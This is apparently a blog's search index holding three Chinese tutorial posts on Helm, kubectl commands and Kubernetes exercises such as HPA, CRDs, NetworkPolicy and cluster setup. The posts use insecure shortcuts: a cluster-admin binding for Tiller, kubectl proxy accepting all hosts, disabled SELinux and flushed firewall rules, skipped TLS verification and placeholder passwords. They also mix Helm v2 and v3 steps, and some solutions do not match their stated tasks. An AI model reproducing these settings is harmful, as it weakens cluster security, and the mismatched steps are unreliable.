<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>云计算方向-Helm入门到实战</title>
    <url>/posts/7a2988b3.html</url>
    <content><![CDATA[详细见(37条消息) kubernetes之helm简介、安装、配置、使用指南_菲宇的博客-CSDN博客_helm
Helm从入门到实践
Helm是Kubernetes的软件包的管理工具.
Helm 是什么Helm 是 Kubernetes 的包管理器。包管理器类似于我们在 Ubuntu 中使用的apt、Centos中使用的yum 或者Python中的 pip 一样，能快速查找、下载和安装软件包。Helm 由客户端组件 helm 和服务端组件 Tiller 组成, 能够将一组K8S资源打包统一管理, 是查找、共享和使用为Kubernetes构建的软件的最佳方式.
Helm 解决了什么痛点？在 Kubernetes中部署一个可以使用的应用，需要涉及到很多的 Kubernetes 资源的共同协作。比如你安装一个 WordPress 博客，用到了一些 Kubernetes (下面全部简称k8s)的一些资源对象，包括 Deployment 用于部署应用、Service 提供服务发现、Secret 配置 WordPress 的用户名和密码，可能还需要 pv 和 pvc 来提供持久化服务。并且 WordPress 数据是存储在mariadb里面的，所以需要 mariadb 启动就绪后才能启动 WordPress。这些 k8s 资源过于分散，不方便进行管理，直接通过 kubectl 来管理一个应用，你会发现这十分蛋疼。 所以总结以上，我们在 k8s 中部署一个应用，通常面临以下几个问题：

如何统一管理,配置和更新这些分散的k8s的应用资源文件
如何分发和复用一套应用模板
如何将应用的一系列资源当作一个软件包管理

Helm 相关组件及概念Helm包含两个组件,分别是helm客户端和Tiller服务器

helm 是一个命令行工具，用于本地开发及管理chart，chart仓库管理等
Tiller 是 Helm 的服务端。Tiller 负责接收 Helm 的请求，与 k8s 的 apiserver 交互，根据chart 来生成一个 release 并管理 release
chart Helm的打包格式叫做chart，所谓chart就是一系列文件, 它描述了一组相关的 k8s 集群资源
release 使用 helm install 命令在 Kubernetes 集群中部署的 Chart 称为 Release
Repoistory Helm chart 的仓库，Helm 客户端通过 HTTP 协议来访问存储库中 chart 的索引文件和压缩包

Helm 原理下面两张图描述了 Helm 的几个关键组件 Helm（客户端）、Tiller（服务器）、Repository（Chart 软件仓库）、Chart（软件包）之间的关系以及它们之间如何通信


创建release
helm 客户端从指定的目录或本地tar文件或远程repo仓库解析出chart的结构信息
helm 客户端指定的 chart 结构和 values 信息通过 gRPC 传递给 Tiller
Tiller 服务端根据 chart 和 values 生成一个 release
Tiller 将install release请求直接传递给 kube-apiserver

删除release
helm 客户端从指定的目录或本地tar文件或远程repo仓库解析出chart的结构信息
helm 客户端指定的 chart 结构和 values 信息通过 gRPC 传递给 Tiller
Tiller 服务端根据 chart 和 values 生成一个 release
Tiller 将delete release请求直接传递给 kube-apiserver

更新release
helm 客户端将需要更新的 chart 的 release 名称 chart 结构和 value 信息传给 Tiller
Tiller 将收到的信息生成新的 release，并同时更新这个 release 的 history
Tiller 将新的 release 传递给 kube-apiserver 进行更新

chart 的基本结构Helm的打包格式叫做chart，所谓chart就是一系列文件, 它描述了一组相关的 k8s 集群资源。Chart中的文件安装特定的目录结构组织, 最简单的chart 目录如下所示：


charts 目录存放依赖的chart
Chart.yaml 包含Chart的基本信息，包括chart版本，名称等
templates 目录下存放应用一系列 k8s 资源的 yaml 模板
_helpers.tpl 此文件中定义一些可重用的模板片断，此文件中的定义在任何资源定义模板中可用
NOTES.txt 介绍chart 部署后的帮助信息，如何使用chart等
values.yaml 包含了必要的值定义（默认值）, 用于存储 templates 目录中模板文件中用到变量的值

安装Helm可以通过预编译的二进制文件来安装helm的客户端命令，具体的版本可以到helm的github上去下载：
https://github.com/helm/helm/releases
本文档使用的版本：
https://get.helm.sh/helm-v3.7.2-linux-amd64.tar.gz
过程Helm客户端安装（1）先上传helm的压缩包到服务器
（2）解压并且复制helm命令
tar -zxf helm-v3.7.2-linux-amd64.tar.gz \&amp;&amp; cd linux-amd64 \cp helm /usr/local/bin/

（3）验证helm命令
输入helm命令，如果输出如下，则表示helm安装成功
[root@nccztsjb-node-11 linux-amd64]# helmThe Kubernetes package managerCommon actions for Helm:- helm search:    search for charts- helm pull:      download a chart to your local directory to view- helm install:   upload the chart to Kubernetes- helm list:      list releases of chartsEnvironment variables:| Name                               | Description                                                                       ||------------------------------------|-----------------------------------------------------------------------------------|| $HELM_CACHE_HOME                   | set an alternative location for storing cached files.                             || $HELM_CONFIG_HOME                  | set an alternative location for storing Helm configuration.                       || $HELM_DATA_HOME                    | set an alternative location for storing Helm data.                                || $HELM_DEBUG                        | indicate whether or not Helm is running in Debug mode                             || $HELM_DRIVER                       | set the backend storage driver. Values are: configmap, secret, memory, sql.       || $HELM_DRIVER_SQL_CONNECTION_STRING | set the connection string the SQL storage driver should use.                      || $HELM_MAX_HISTORY                  | set the maximum number of helm release history.                                   || $HELM_NAMESPACE                    | set the namespace used for the helm operations.                                   || $HELM_NO_PLUGINS                   | disable plugins. Set HELM_NO_PLUGINS=1 to disable plugins.                        || $HELM_PLUGINS                      | set the path to the plugins directory                                             || $HELM_REGISTRY_CONFIG              | set the path to the registry config file.                                         || $HELM_REPOSITORY_CACHE             | set the path to the repository cache directory                                    || $HELM_REPOSITORY_CONFIG            | set the path to the repositories file.                                            || $KUBECONFIG                        | set an alternative Kubernetes configuration file (default &quot;~/.kube/config&quot;)       || $HELM_KUBEAPISERVER                | set the Kubernetes API Server Endpoint for authentication                         || $HELM_KUBECAFILE                   | set the Kubernetes certificate authority file.                                    || $HELM_KUBEASGROUPS                 | set the Groups to use for impersonation using a comma-separated list.             || $HELM_KUBEASUSER                   | set the Username to impersonate for the operation.                                || $HELM_KUBECONTEXT                  | set the name of the kubeconfig context.                                           || $HELM_KUBETOKEN                    | set the Bearer KubeToken used for authentication.                                 |Helm stores cache, configuration, and data based on the following configuration order:- If a HELM_*_HOME environment variable is set, it will be used- Otherwise, on systems supporting the XDG base directory specification, the XDG variables will be used- When no other location is set a default location will be used based on the operating systemBy default, the default directories depend on the Operating System. The defaults are listed below:| Operating System | Cache Path                | Configuration Path             | Data Path               ||------------------|---------------------------|--------------------------------|-------------------------|| Linux            | $HOME/.cache/helm         | $HOME/.config/helm             | $HOME/.local/share/helm || macOS            | $HOME/Library/Caches/helm | $HOME/Library/Preferences/helm | $HOME/Library/helm      || Windows          | %TEMP%\helm               | %APPDATA%\helm                 | %APPDATA%\helm          |Usage:  helm [command]Available Commands:  completion  generate autocompletion scripts for the specified shell  create      create a new chart with the given name  dependency  manage a chart&#x27;s dependencies  env         helm client environment information  get         download extended information of a named release  help        Help about any command  history     fetch release history  install     install a chart  lint        examine a chart for possible issues  list        list releases  package     package a chart directory into a chart archive  plugin      install, list, or uninstall Helm plugins  pull        download a chart from a repository and (optionally) unpack it in local directory  repo        add, list, remove, update, and index chart repositories  rollback    roll back a release to a previous revision  search      search for a keyword in charts  show        show information of a chart  status      display the status of the named release  template    locally render templates  test        run tests for a release  uninstall   uninstall a release  upgrade     upgrade a release  verify      verify that a chart at the given path has been signed and is valid  version     print the client version informationFlags:      --debug                       enable verbose output  -h, --help                        help for helm      --kube-apiserver string       the address and the port for the Kubernetes API server      --kube-as-group stringArray   group to impersonate for the operation, this flag can be repeated to specify multiple groups.      --kube-as-user string         username to impersonate for the operation      --kube-ca-file string         the certificate authority file for the Kubernetes API server connection      --kube-context string         name of the kubeconfig context to use      --kube-token string           bearer token used for authentication      --kubeconfig string           path to the kubeconfig file  -n, --namespace string            namespace scope for this request      --registry-config string      path to the registry config file (default &quot;/root/.config/helm/registry.json&quot;)      --repository-cache string     path to the file containing cached repository indexes (default &quot;/root/.cache/helm/repository&quot;)      --repository-config string    path to the file containing repository names and URLs (default &quot;/root/.config/helm/repositories.yaml&quot;)Use &quot;helm [command] --help&quot; for more information about a command.

Helm 服务端安装Tiller注意:现在K8S集群上每个节点安装socat软件(yum install -y socat),不然会报错:
E0522 22:22:15.492436   24409 portforward.go:331] an error occurred forwarding 38398 -&gt; 44134: error forwarding port 44134 to pod dc6da4ab99ad9c497c0cef1776b9dd18e0a612d507e2746ed63d36ef40f30174, uid : unable to do port forwarding: socat not found.Error: cannot connect to Tiller

Tiller 是以 Deployment 方式部署在 Kubernetes 集群中的，只需使用以下指令便可简单的完成安装。
helm init

由于 Helm 默认会去 storage.googleapis.com 拉取镜像，如果你当前执行的机器不能访问该域名的话可以使用以下命令来安装：
helm init --client-only --stable-repo-url https://aliacs-app-catalog.oss-cn-hangzhou.aliyuncs.com/charts/helm repo add incubator https://aliacs-app-catalog.oss-cn-hangzhou.aliyuncs.com/charts-incubator/helm repo update

# 创建服务端helm init --service-account tiller --upgrade -i registry.cn-hangzhou.aliyuncs.com/google_containers/tiller:v2.9.1  --stable-repo-url https://kubernetes.oss-cn-hangzhou.aliyuncs.com/charts # 创建TLS认证服务端，参考地址：https://github.com/gjmzj/kubeasz/blob/master/docs/guide/helm.mdhelm init --service-account tiller --upgrade -i registry.cn-hangzhou.aliyuncs.com/google_containers/tiller:v2.9.1 --tiller-tls-cert /etc/kubernetes/ssl/tiller001.pem --tiller-tls-key /etc/kubernetes/ssl/tiller001-key.pem --tls-ca-cert /etc/kubernetes/ssl/ca.pem --tiller-namespace kube-system --stable-repo-url https://kubernetes.oss-cn-hangzhou.aliyuncs.com/charts

在 Kubernetes 中安装 Tiller 服务，因为官方的镜像因为某些原因无法拉取，使用-i指定自己的镜像，可选镜像：registry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F;tiller:v2.9.1（阿里云），该镜像的版本与helm客户端的版本相同，使用helm version可查看helm客户端版本。
给Tiller授权因为 Helm 的服务端 Tiller 是一个部署在 Kubernetes 中 Kube-System Namespace 下 的 Deployment，它会去连接 Kube-Api 在 Kubernetes 里创建和删除应用。
而从 Kubernetes 1.6 版本开始，API Server 启用了 RBAC 授权。目前的 Tiller 部署时默认没有定义授权的 ServiceAccount，这会导致访问 API Server 时被拒绝。所以我们需要明确为 Tiller 部署添加授权。
创建 Kubernetes 的服务帐号和绑定角色
$ kubectl create serviceaccount --namespace kube-system tiller$ kubectl create clusterrolebinding tiller-cluster-rule --clusterrole=cluster-admin --serviceaccount=kube-system:tiller

为 Tiller 设置帐号
# 使用 kubectl patch 更新 API 对象$ kubectl patch deploy --namespace kube-system tiller-deploy -p &#x27;&#123;&quot;spec&quot;:&#123;&quot;template&quot;:&#123;&quot;spec&quot;:&#123;&quot;serviceAccount&quot;:&quot;tiller&quot;&#125;&#125;&#125;&#125;&#x27;deployment.extensions &quot;tiller-deploy&quot; patched

查看是否授权成功
$ kubectl get deploy --namespace kube-system   tiller-deploy  --output yaml|grep  serviceAccountserviceAccount: tillerserviceAccountName: tiller

验证 Tiller 是否安装成功$ kubectl -n kube-system get pods|grep tillertiller-deploy-6d68f5c78f-nql2z          1/1       Running   0          5m $ helm versionClient: &amp;version.Version&#123;SemVer:&quot;v2.9.1&quot;, GitCommit:&quot;20adb27c7c5868466912eebdf6664e7390ebe710&quot;, GitTreeState:&quot;clean&quot;&#125;Server: &amp;version.Version&#123;SemVer:&quot;v2.9.1&quot;, GitCommit:&quot;20adb27c7c5868466912eebdf6664e7390ebe710&quot;, GitTreeState:&quot;clean&quot;&#125;

Helm 常用命令查看版本
#helm version 
查看当前安装的charts
#helm list
查询 charts
#helm search redis
安装charts
#helm install –name redis –namespaces prod bitnami&#x2F;redis
查看charts状态
#helm status redis
删除charts
#helm delete –purge redis
增加repo
#helm repo add stable https://kubernetes.oss-cn-hangzhou.aliyuncs.com/charts
#helm repo add –username admin –password password myharbor https://harbor.qing.cn/chartrepo/charts
更新repo仓库资源
#helm repo update
创建charts
#helm create helm_charts
测试charts语法
#helm lint 

打包charts
#cd helm_charts &amp;&amp; helm package .&#x2F;
查看生成的yaml文件
#helm template helm_charts-0.1.1.tgz
更新image
#helm upgrade –set image.tag&#x3D;’v2019-05-09-18-48-40’ study-api-en-oral myharbor&#x2F;study-api-en-oral
回滚relase
#helm hist study-api-en-oral
#helm rollback study-api-en-oral 4
发布到私有harbor仓库脚本
request_url&#x3D;’https://harbor.qing.cn/api/chartrepo/charts/charts‘
user_name&#x3D;’admin’
password&#x3D;’password’
chart_file&#x3D;’helm_charts-0.1.3.tgz’
curl -i -u “$user_name:$password” -k -X POST “${request_url}” \
-H “accept: application&#x2F;json” \
-H “Content-Type: multipart&#x2F;form-data” \
-F “chart&#x3D;@${chart_file};type&#x3D;application&#x2F;x-compressed”
echo $result
]]></content>
      <categories>
        <category>云计算</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>Helm</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-Kubernetes命令总结</title>
    <url>/posts/fb59692f.html</url>
    <content><![CDATA[一.基础命令1.状态查询# 查看集群信息kubectl cluster-infosystemctl status kube-apiserversystemctl status kubeletsystemctl status kube-proxysystemctl status kube-schedulersystemctl status kube-controller-managersystemctl status docker# 查询api服务kubectl get apiservice

2.node相关# 查看namespaceskubectl get namespaces# 为节点增加lablekubectl label nodes 10.126.72.31 points=test# 查看节点和lablekubectl get nodes --show-labels# 查看状态kubectl get componentstatuses# Node的隔离与恢复## 隔离kubectl cordon k8s-node1## 恢复kubectl uncordon k8s-node1

3.查询# 查看nodes节点kubectl get nodes# 通过yaml文件查询kubectl get -f xxx-yaml/# 查询全部类型kubectl get all# 查询资源kubectl get resourcequota# endpoints端kubectl get endpoints# 查看pods# 查看指定空间`kube-system`的podskubectl get po -n kube-system# 查看所有空间的kubectl get pods -o wide --all-namespaces# 其他的写法kubectl get pod -o wide --namespace=kube-system# 获取svckubectl get svc --all-namespaces# 其他写法kubectl get services --all-namespaces# 通过lable查询kubectl get pods -l app=nginx -o yaml|grep podIP# 当我们发现一个pod迟迟无法创建时，描述一个podskubectl describe pod xxx# 查询事件kubectl get events --all-namespaces

4.删除所有pod# 删除所有podskubectl delete pods --all# 删除所有包含某个lable的pod和serivcekubectl delete pods,services -l name=&lt;lable-name&gt;# 删除ui server,然后重建kubectl delete deployments kubernetes-dashboard --namespace=kube-systemkubectl delete services kubernetes-dashboard --namespace=kube-system# 强制删除部署kubectl delete deployment kafka-1# 删除rckubectl delete rs --all &amp;&amp; kubectl delete rc --all## 强制删除Terminating状态的podkubectl delete deployment kafka-1 --grace-period=0 --force

5.滚动#升级kubectl apply -f xxx.yaml --record#回滚kubectl rollout undo deployment javademo#查看滚动升级记录kubectl rollout history depolyment &#123;名称&#125;

6.查看日志# 查看指定镜像的日志kubectl logs -f kube-dns-699984412-vz1q6 -n kube-systemkubectl logs --tail=10 nginx  #指定其中一个查看日志kubectl logs kube-dns-699984412-n5zkz -c kubedns --namespace=kube-systemkubectl logs kube-dns-699984412-vz1q6 -c dnsmasq --namespace=kube-systemkubectl logs kube-dns-699984412-mqb14 -c sidecar --namespace=kube-system# 看日志journalctl -f

7.扩展# 启动nohup kubectl proxy --address=&#x27;10.1.70.247&#x27; --port=8001 --accept-hosts=&#x27;^*$&#x27; &gt;/dev/null 2&gt;&amp;1 &amp;# 进入镜像kubectl exec kube-dns-699984412-vz1q6 -n kube-system -c kubedns ifconfigkubectl exec kube-dns-699984412-vz1q6 -n kube-system -c kubedns ifconfig /bin/bash# 执行镜像内命令kubectl exec kube-dns-4140740281-pfjhr -c etcd --namespace=kube-system etcdctl get /skydns/local/cluster/default/redis-master

8.无限循环的命令while true; do sleep 1; done

9.其他# 创建和删除kubectl create -f dashboard-controller.yamlkubectl delete -f dashboard-dashboard.yaml# 替换&amp;&amp;应用kubectl apply -f xxx.yamlkubectl replace -f xxx.yaml# 查看指定pods的环境变量kubectl exec xxx env# 判断dns是否通kubectl exec busybox -- nslookup kube-dns.kube-system# kube-proxy状态systemctl status kube-proxy -l# token的kubectl get serviceaccount/kube-dns --namespace=kube-system -o yaml|grep token

]]></content>
      <categories>
        <category>云计算</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-Kubernetes调优</title>
    <url>/posts/4d653f4a.html</url>
    <content><![CDATA[K8S调优[TOC]
一.健康检查题目要求1.健康检查--ExecAction在 master 节点/root 目录下编写 yaml 文件 liveness_exec.yaml，具体要求如下：（1）Pod 名称：liveness-exec；（2）命名空间：default；（3）镜像：busybox；容器名称：liveness；（4）容器启动时运行命令“touch /tmp/healthy; sleep 60; rm -rf /tmp/healthy; sleep 600”，此命令在容器启动时创建/tmp/healthy 文件，并于 60 秒之后将其删除；（5）存活性探针运行“test -e /tmp/healthy”命令检查文件的存在性，若文件存在则返回状态码为 0，表示成功通过测试；（6）启动后延时 5 秒开始运行检测；（7）每隔 5 秒执行一次 liveness probe。完成后使用该 yaml 文件创建 Pod

1.解决方法在root目录下创建 live-ness.yaml文件#vi live-ness.yaml

①编写yaml文件apiVersion: v1kind: Podmetadata:  labels:    test: liveness  name: liveness-execspec:  containers:  - name: liveness    image: busybox    args:    - /bin/sh    - -c    - touch /tmp/healthy; sleep 60; rm -rf /tmp/healthy; sleep 600    livenessProbe:      exec:        command:        - test        - -e        - /tmp/healthy      initialDelaySeconds: 5 #检查文件延迟五秒进行      periodSeconds: 5    #每五秒执行一次检查

②最后可观察到pod会重启，任务完成。二.更新证书题目要求2.更新证书Kubernetes 默认的证书有效期只有一年时间，对于某些场景下一个足够长的证书有效期是非常有必要的。请将 Kubernetes 集群证书的有效期延长至 10 年。

1. go环境部署wget https://dl.google.com/go/go1.12.7.linux-amd64.tar.gztar -zxvf go1.12.7.linux-amd64.tar.gz -C /usr/localvi /etc/profile  #修改的内容放在最后即可   export PATH=$PATH:/usr/local/go/binsource /etc/profile #让文件生效

2.下载源码cd /data &amp;&amp; git clone https://github.com/kubernetes/kubernetes.gitgit checkout -b remotes/origin/release-1.15.1 v1.15.1

3.修改 kubeadm 源码包更新证书策略cd kubernetesvi staging/src/k8s.io/client-go/util/cert/cert.go   #kubeadm 1.14 版本之前vi cmd/kubeadm/app/util/pkiutil/pki_helpers.go     #kubeadm 1.14 至今    const duration3650d = time.Hour * 24 *365 * 10  #定义一个常量 大约在540多行    NotAfter:          time.Now().Add(duration3650d).UTC(),make WHAT=cmd/kubeadm GOFLAGS=-vcp _output/bin/kubeadm /root/kubeadm-new



4.更新 kubeadm#将 kubeadm 进行替换cp /usr/bin/kubeadm /usr/bin/kubeadm.oldcp /root/kubeadm-new /usr/bin/kubeadmchmod a+x /usr/bin/kubeadm

5.更新各节点证书至Master节点cp -r /etc/kubernetes/pki /etc/kubernetes/pki.oldcd /etc/kubernetes/pkikubeadm alpha certs renew all --config=/root/kubeadm-config.yaml #若没有该文件可以使用kubeadm config print init-defaults  &gt; kubeadm-config.yaml  用来生成kubeadm-config.yaml 文件openssl x509 -in apiserver.crt -text -noout | grep Not

6. HA集群其余master节点证书更新
三.自定义资源管理（CRD）CRD简介Custom resources：是对K8S API的扩展，代表了一个特定的kubetnetes的定制化安装。在一个运行中的集群中，自定义资源可以动态注册到集群中。注册完毕以后，用户可以通过kubelet创建和访问这个自定义的对象，类似于操作pod一样。
Custom controllers：Custom resources可以让用户简单的存储和获取结构化数据。只有结合控制器才能变成一个真正的declarative API（被声明过的API）。控制器可以把资源更新成用户想要的状态，并且通过一系列操作维护和变更状态。定制化控制器是用户可以在运行中的集群内部署和更新的一个控制器，它独立于集群本身的生命周期。定制化控制器可以和任何一种资源一起工作，当和定制化资源结合使用时尤其有效。
Operator模式 是一个customer controllers和Custom resources结合的例子。它可以允许开发者将特殊应用编码至kubernetes的扩展API内。
题目要求：3.自定义资源管理在 Kubernetes 中一切都可视为资源，通过自定义资源我们可以向 Kubernetes API 中增加新资源类型。在 master 节点/root 目录下编写 yaml 文件 resource.yaml，具体要求如下：（1）自定义资源名称：crontabs.stable.example.com；（2）指定自定义资源作用范围为命名空间；（3）指定每个版本都可以通过 served 标志来独立启用或禁止；（4）指定其中有且只有一个版本必需被标记为存储版本 v1。完成后使用该 yaml 文件创建自定义资源

1.编写crontab_crd.ymlapiVersion: apiextensions.k8s.io/v1beta1kind: CustomResourceDefinitionmetadata:  # 称必须与下面的spec字段匹配，格式为: &lt;plural&gt;.&lt;group&gt;  name: crontabs.crd.test.comspec:  # 用于REST API的组名称: /apis/&lt;group&gt;/&lt;version&gt;  group: crd.test.com  versions:  - name: v1    # 每个版本都可以通过服务标志启用/禁用。    served: true    # 必须将一个且只有一个版本标记为存储版本。    storage: true  scope: Namespaced  # 指定crd资源作用范围在命名空间或集群  names:    # URL中使用的复数名称: /apis/&lt;group&gt;/&lt;version&gt;/&lt;plural&gt;    plural: crontabs    # 在CLI(shell界面输入的参数)上用作别名并用于显示的单数名称    singular: crontab    kind: CronTab    # 短名称允许短字符串匹配CLI上的资源，意识就是能通过kubectl 在查看资源的时候使用该资源的简名称来获取。    shortNames:    - ct

2.创建crdkubectl apply -f crontab_crd.ymlkubectl get crd | grep crontab   #查看crd

3.编写测试文件test_crontab.yamlapiVersion: crd.test.com/v1kind: CronTabmetadata:  name: my-test-crontabspec:  cronSpec: &quot;* * * * */10&quot;  image: my-test-image  replicas: 2

4.创建测试文件并检查是否成功kubectl apply -f test_crontab.ymlkubectl get ct

5.删除自定义对象kubectl delete  ct my-test-crontab  #删除自定义对象kubectl delete crd crontabs.crd.test.com  #删除crd



四.HPA管理原理：HPA可以获取每个Pod利用率，然后和HPA中定义的指标进行对比，同时计算出需要伸缩的具体值，最后实现Pod的数量的调整。其实HPA与之前的Deployment一样，也属于一种Kubernetes资源对象，它通过追踪分析RC控制的所有目标Pod的负载变化情况，来确定是否需要针对性地调整目标Pod的副本数，这是HPA的实现原理。
题目要求在 master 节点&#x2F;root 目录下编写 yaml 文件 deployment-hpa.yaml，具体要求如下：（1）HPA 名称：deployment-hpa；（2）命名空间：default；（3）基于 deployment 进行伸缩，副本数伸缩范围：1–10；（4）期望每个 Pod 的 CPU 和内存使用率为 50%。完成后使用该 yaml 文件创建 HPA
1.安装metrics-server(用来收集集群中的资源使用情况)
#安装gitwget -c https://github.com/kubernetes-sigs/metrics-server/archive/v0.3.6.zip#解压文件unzip v0.3.6.zip

# 修改deployment, 注意修改的是镜像和初始化参数cd /root/metrics-server/deploy/1.8+/vi metrics-server-deployment.yamlapiVersion: v1kind: ServiceAccountmetadata:  name: metrics-server  namespace: kube-system---apiVersion: apps/v1kind: Deploymentmetadata:  name: metrics-server  namespace: kube-system  labels:    k8s-app: metrics-serverspec:  selector:    matchLabels:      k8s-app: metrics-server  template:    metadata:      name: metrics-server      labels:        k8s-app: metrics-server    spec:      serviceAccountName: metrics-server      volumes:      # mount in tmp so we can safely use from-scratch images and/or read-only containers      - name: tmp-dir        emptyDir: &#123;&#125;      containers:      - name: metrics-server        image: k8s.gcr.io/metrics-server-amd64:v0.3.6        imagePullPolicy: IfNotPresent        command:            - /metrics-server            #start            - --kubelet-preferred-address-types=InternalIP            - --kubelet-insecure-tls            #end        volumeMounts:        - name: tmp-dir          mountPath: /tmp

#安装软件kubectl apply -f .# 查看pod运行情况kubectl get pod -n kube-systemmetrics-server-6b976979db-2xwbj   1/1     Running   0           90s          # 使用kubectl top node 查看资源使用情况kubectl top nodeNAME           CPU(cores)   CPU%   MEMORY(bytes)   MEMORY%k8s-master01   289m         14%    1582Mi          54%       k8s-node01     81m          4%     1195Mi          40%       k8s-node02     72m          3%     1211Mi          41%  kubectl top pod -n kube-systemNAME                              CPU(cores)   MEMORY(bytes)coredns-6955765f44-7ptsb          3m           9Micoredns-6955765f44-vcwr5          3m           8Mietcd-master                       14m          145Mi...# 至此,metrics-server安装完成

2.准备deployment和service创建pc-hpa-pod.yaml文件，内容如下：
apiVersion: apps/v1kind: Deploymentmetadata:   name: nginx  namespace: defaultspec:   replicas: 1  selector:    matchLabels:      app: nginx-pod  template:    metadata:      labels:        app: nginx-pod    spec:      containers:      - name: nginx        image: nginx:1.17.1        resources: # 资源配额          limits:  # 限制资源（上限）            cpu: &quot;1&quot; # CPU限制，单位是core数          requests: # 请求资源（下限）            cpu: &quot;100m&quot;  # CPU限制，单位是core数

#创建servicekubectl expose deployment nginx --type=NodePort --port=80

3.创建HPA
创建pc-hpa.yaml文件，内容如下：
apiVersion: autoscaling/v1kind: HorizontalPodAutoscalermetadata:  name: pc-hpa  namespace: defaultspec:  minReplicas: 1  #最小pod数量  maxReplicas: 10 #最大pod数量  targetCPUUtilizationPercentage: 3 # CPU使用率指标  scaleTargetRef:   # 指定要控制的nginx信息    apiVersion: apps/v1    kind: Deployment    name: nginx

# 创建hpa[root@k8s-master01 1.8+]# kubectl create -f pc-hpa.yamlhorizontalpodautoscaler.autoscaling/pc-hpa created# 查看hpa    [root@k8s-master01 1.8+]# kubectl get hpa NAME     REFERENCE          TARGETS   MINPODS   MAXPODS   REPLICAS   AGEpc-hpa   Deployment/nginx   0%/3%     1         10        1          62s

4.测试使用压测工具对service地址10.1.0.100:31830进行压测，然后通过控制台查看hpa和pod的变化
hpa变化
kubectl get hpa  -w

deployment变化
kubectl get pods  -w



五.NetworkPolicy 管理题目要求：在 master 节点&#x2F;root 目录下编写 yaml 文件 network-policy-deny.yaml，具体要求如下：（1）NetworkPolicy 名称：default-deny；（2）命名空间：default；（3）默认禁止所有入 Pod 流量。完成后使用该 yaml 文件创建 NetworkPolicy
注意需要安装插件并且需要较高的K8S版本以
[v1.21.1为例]: 
1.部署网络注意：
​        CNI插件需要启用，Calico安装为CNI插件。必须通过传递--network-plugin=cni参数将kubelet配置为使用CNI网络。（在kubeadm上，这是默认设置。）
​       我们这里使用Kubernetes的etcd进行安装，首先确保Kubernetes设置--cluster-cidr=10.244.0.0/16和--allocate-node-cidrs=true。（kubeadm是默认安装的）
我们集群启动了RBAC，所以要创建RBAC
kubectl apply -f https://docs.projectcalico.org/v3.3/getting-started/kubernetes/installation/hosted/canal/rbac.yaml

安装calico
kubectl apply -f https://docs.projectcalico.org/v3.3/getting-started/kubernetes/installation/hosted/canal/canal.yaml



①下载 calico 网络需要用到的镜像docker pull docker.io/calico/cni:v3.21.1 docker pull docker.io/calico/pod2daemon-flexvol:v3.21.1docker pull docker.io/calico/node:v3.21.1docker pull docker.io/calico/kube-controllers:v3.21.1

更改网络类型kubectl delete -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml



②下载calico网络的yaml部署文件#获取calico的yaml文件 wget https://docs.projectcalico.org/manifests/calico.yaml --no-check-certificate #查看镜像是否正确   cat calico.yaml | grep image          image: docker.io/calico/cni:v3.21.1          image: docker.io/calico/cni:v3.21.1          image: docker.io/calico/pod2daemon-flexvol:v3.21.1          image: docker.io/calico/node:v3.21.1          image: docker.io/calico/kube-controllers:v3.21.1#部署网络kubectl apply -f calico.yaml #查看pod是否正常运行kubectl get pods -A

2.定义一个入站流量拒绝的规则apiVersion: networking.k8s.io/v1kind: NetworkPolicymetadata:  name: deny-all-policyspec:  podSelector: &#123;&#125;  policyTypes:  - Ingress$ kubectl apply -f network-policy.yaml  -n dev

3.在dev和prod的namespace下个各自创建一个podapiVersion: v1kind: Podmetadata:  name: pod-1  labels:    name: myappspec:  containers:  - name: myapp    image: ikubernetes/myapp:v1$  kubectl apply -f policy-pod.yaml  -n dev$  kubectl apply -f policy-pod.yaml  -n prod# 测试一下$ kubectl get pod -o wide   -n prod NAME      READY     STATUS    RESTARTS   AGE       IP           NODEpod-1     1/1       Running   0          3h        10.244.2.3   k8s-node02$ kubectl get pod -owide   -n dev NAME      READY     STATUS    RESTARTS   AGE       IP           NODEpod-1     1/1       Running   0          3h        10.244.2.2   k8s-node02$ curl 10.244.2.3Hello MyApp | Version: v1 | &lt;a href=&quot;hostname.html&quot;&gt;Pod Name&lt;/a&gt;$ 10.244.2.2 不通



六.k8s安装v2.21.12.6 系统初始化2.6.1 设置系统主机名以及 Host 文件的相互解析hostnamectl set-hostname k8s-master01 &amp;&amp; bashhostnamectl set-hostname k8s-node01 &amp;&amp; bashhostnamectl set-hostname k8s-node02 &amp;&amp; bash

cat &lt;&lt;EOF&gt;&gt; /etc/hosts192.168.5.3     k8s-master01192.168.5.4     k8s-node01192.168.5.5     k8s-node02EOF

scp /etc/hosts root@192.168.5.4:/etc/hosts scp /etc/hosts root@192.168.5.5:/etc/hosts 

2.6.2 安装依赖文件（所有节点都要操作）yum install -y conntrack ntpdate ntp ipvsadm ipset jq iptables curl sysstat libseccomp wget vim net-tools git

2.6.3 设置防火墙为 Iptables 并设置空规则（所有节点都要操作）systemctl stop firewalld &amp;&amp; systemctl disable firewalldyum -y install iptables-services &amp;&amp; systemctl start iptables &amp;&amp; systemctl enable iptables &amp;&amp; iptables -F &amp;&amp; service iptables save

2.6.4 关闭 SELINUX（所有节点都要操作）swapoff -a &amp;&amp; sed -i &#x27;/ swap / s/^\(.*\)$/#\1/g&#x27; /etc/fstabsetenforce 0 &amp;&amp; sed -i &#x27;s/^SELINUX=.*/SELINUX=disabled/&#x27; /etc/selinux/config

2.6.5 调整内核参数，对于 K8S（所有节点都要操作）modprobe br_netfiltercat &lt;&lt;EOF&gt; kubernetes.conf net.bridge.bridge-nf-call-iptables=1net.bridge.bridge-nf-call-ip6tables=1net.ipv4.ip_forward=1net.ipv4.tcp_tw_recycle=0vm.swappiness=0 # 禁止使用 swap 空间，只有当系统 OOM 时才允许使用它vm.overcommit_memory=1 # 不检查物理内存是否够用vm.panic_on_oom=0 # 开启 OOMfs.inotify.max_user_instances=8192fs.inotify.max_user_watches=1048576fs.file-max=52706963fs.nr_open=52706963net.ipv6.conf.all.disable_ipv6=1net.netfilter.nf_conntrack_max=2310720EOFcp kubernetes.conf /etc/sysctl.d/kubernetes.confsysctl -p /etc/sysctl.d/kubernetes.conf

